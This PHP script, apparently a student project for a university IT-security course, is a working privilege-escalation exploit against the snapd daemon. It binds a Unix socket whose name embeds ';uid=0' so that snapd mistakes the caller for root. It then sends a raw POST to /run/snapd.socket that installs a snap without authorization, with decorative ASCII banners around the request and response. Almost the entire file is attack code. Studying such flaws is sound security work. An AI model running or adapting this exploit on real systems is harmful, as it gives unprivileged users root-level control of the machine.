<?php

echo "
  _____ _             _ _                       _          _ _   
 / ____| |           | (_)                     | |        (_) |  
| (___ | |_ _   _  __| |_  ___ _ __   __ _ _ __| |__   ___ _| |_ 
 \___ \| __| | | |/ _` | |/ _ \ '_ \ / _` | '__| '_ \ / _ \ | __|
 ____) | |_| |_| | (_| | |  __/ | | | (_| | |  | |_) |  __/ | |_ 
|_____/ \__|\__,_|\__,_|_|\___|_| |_|\__,_|_|  |_.__/ \___|_|\__|
                                                    
    //=========[]==========================================\\
    || Subject || IT-Security                              ||
    || Source  || Hochschule für Angewandte Wissenschaften ||
    || Details || Dennis Brysiuk and Walter Ehrenberger    ||
    \\=========[]==========================================//\n\n";  
 

    //path and name for socket
    $injectedPath = "/tmp/hack4gaming;uid=0;";

    //Path for snapd API Socket
    $snapdSocketPath = "/run/snapd.socket";
    
    echo "Install game: ";
    $handle = fopen ("php://stdin","r");
    $game = fgets($handle);

    /*
    Create a Socket (endpoint for communication)
    domain = AF_UNIX (local communication)
    type = SOCK_STREAM (communication semantic 2-way connection based byte stream)
    protocol = 0 (default, AF_UNIX no such protocol overhead)
    */
    $socket = socket_create(AF_UNIX, SOCK_STREAM, 0);
    if (!$socket){
        die('Unable to create AF_UNIX socket');
    }else {
        echo "Socket created\n\n";
    }

    /*
    Bind a name to a socket
    socket = socket resource created with socket_create()
    addresss = path of a Unix-domain socket with super root id -> UID=0)
    */
    socket_bind($socket, "/tmp/hack4gaming;uid=0");

    /*
    Initiates a connection on a socket
    socket = valid socket resource with name super root UID
    address = "/run/snapd.socket" (snapd API Socket)
    */
    socket_connect($socket, "/run/snapd.socket");

    /*
    POST Request /v2/snaps/{name} can install, refresh, remove, revert, enable or disable apps form snap app store
    */
    $payload = '{"action": "install", "channel": "stable"}';
    $len = strlen($payload);
    $req = "POST /v2/snaps/openra HTTP/1.1\r\n"
    ."Host: localhost\r\n"
    ."Content-Length: " . $len . "\r\n\r\n"
    . $payload;

    /*
    Sends data to a connected socket
    socket = valid socket resource with super root UID connected to snapd API socket
    buf = POST Request /v2/snaps/{name} (containing the data that will be sent to the remote host)
    len = the number of byted that will be sent to the remove host
    flags = 0 (default)
    */
    echo "\n
    _____  ______ ____  _    _ ______  _____ _______ 
   |  __ \|  ____/ __ \| |  | |  ____|/ ____|__   __|
   | |__) | |__ | |  | | |  | | |__  | (___    | |   
   |  _  /|  __|| |  | | |  | |  __|  \___ \   | |   
   | | \ \| |___| |__| | |__| | |____ ____) |  | |   
   |_|  \_\______\___\_\\____/|______|_____/   |_|   
                                                     
".$req . "\n";

    socket_send($socket, $req, strlen($req),0);
    
    /*
    Reads a maximum of lenght byted from a socket
    socket = valid socket resource with super root UID connected to snapd API socket
    length = the maximum number of bytes
    */
    $status = socket_read($socket, 1024);
    
    echo "\n
    _____  ______ _____  _  __     __
   |  __ \|  ____|  __ \| | \ \   / /
   | |__) | |__  | |__) | |  \ \_/ / 
   |  _  /|  __| |  ___/| |   \   /  
   | | \ \| |____| |    | |____| |   
   |_|  \_\______|_|    |______|_|   
                    
".$status."\n";
    
    /*
    Closes a socket resource
    socket = a valid socket resource
    */
    socket_close($socket);
    echo "installing";
    
    

echo "\n
_    _     __      ________   ______ _    _ _   _ 
| |  | |   /\ \    / /  ____| |  ____| |  | | \ | |
| |__| |  /  \ \  / /| |__    | |__  | |  | |  \| |
|  __  | / /\ \ \/ / |  __|   |  __| | |  | | . ` |
| |  | |/ ____ \  /  | |____  | |    | |__| | |\  |
|_|  |_/_/    \_\/   |______| |_|     \____/|_| \_|
                                                  
\n\n";

?>
